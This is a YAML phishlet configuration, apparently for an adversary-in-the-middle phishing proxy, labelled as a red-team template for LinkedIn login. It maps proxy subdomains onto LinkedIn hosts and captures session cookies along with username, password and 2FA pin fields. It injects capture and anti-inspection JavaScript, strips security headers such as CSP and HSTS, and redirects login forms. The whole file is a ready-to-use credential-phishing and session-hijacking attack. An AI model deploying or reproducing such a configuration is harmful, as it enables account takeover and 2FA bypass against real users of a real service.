name: "LinkedIn-Login"
author: "Vanta v5 Red Team"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "linkedin"
    target: "www.linkedin.com"
  - subdomain: "static"
    target: "static.licdn.com"
  - subdomain: "media"
    target: "media.licdn.com"
  - subdomain: "api"
    target: "api.linkedin.com"
  - subdomain: "platform"
    target: "platform.linkedin.com"
auth_urls: 
  - "/login"
  - "/checkpoint/lg/login-submit"
  - "/uas/login"
landing_path: 
  - "/login"
  - "/uas/login"
auth_tokens:
  - {type: "cookie", name: "li_at"}
  - {type: "cookie", name: "JSESSIONID"}
  - {type: "cookie", name: "li_ap"}
  - {type: "cookie", name: "lang"}
  - {type: "cookie", name: "bcookie"}
  - {type: "cookie", name: "bscookie"}
  - {type: "cookie", name: "visit"}
  - {type: "cookie", name: "li_sugr"}
  - {type: "cookie", name: "lidc"}
  - {type: "cookie", name: "lissc"}
credentials:
  - {type: "post_param", name: "session_key", regex: null}
  - {type: "post_param", name: "session_password", regex: null}
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "pin", regex: null} # 2FA pin
injections:
  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
  - trigger_path: "/login"
    position: "body_end"
    content: |
      (function(){
        // LinkedIn Anti-Bot Evasion
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
        
        // Disable right-click for security
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
          if(e.keyCode == 123) return false;
          if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
          if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
          if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        }
      })();
sub_filters:
  - {triggers_on: "www.linkedin.com", orig_sub: "www", domain: "linkedin.com", search: "https://www.linkedin.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "static.licdn.com", orig_sub: "static", domain: "licdn.com", search: "https://static.licdn.com/", replace: "https://{hostname}/_listatic/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "media.licdn.com", orig_sub: "media", domain: "licdn.com", search: "https://media.licdn.com/", replace: "https://{hostname}/_limedia/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "api.linkedin.com", orig_sub: "api", domain: "linkedin.com", search: "https://api.linkedin.com/", replace: "https://{hostname}/_liapi/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "platform.linkedin.com", orig_sub: "platform", domain: "linkedin.com", search: "https://platform.linkedin.com/", replace: "https://{hostname}/_liplatform/", mimes: ["text/html", "application/javascript"]}
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "Strict-Transport-Security"}
  - {action: "remove", name: "X-Content-Type-Options"}
  - {action: "remove", name: "Referrer-Policy"}
path_rewrites:
  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/li/px|/instrumentation|/collect", mimes: ["text/javascript", "image/gif"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"checkpoint\"], form[action*=\"login\"]", action_to: "/uas/sessions"}
bridges:
  - {prefix: "/_liapi/", target_host: "api.linkedin.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_listatic/", target_host: "static.licdn.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_limedia/", target_host: "media.licdn.com", strip_prefix: true, cors: "allow_all"}
  - {prefix: "/_liplatform/", target_host: "platform.linkedin.com", strip_prefix: true, cors: "allow_all"}
cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
  headers: ["*"]
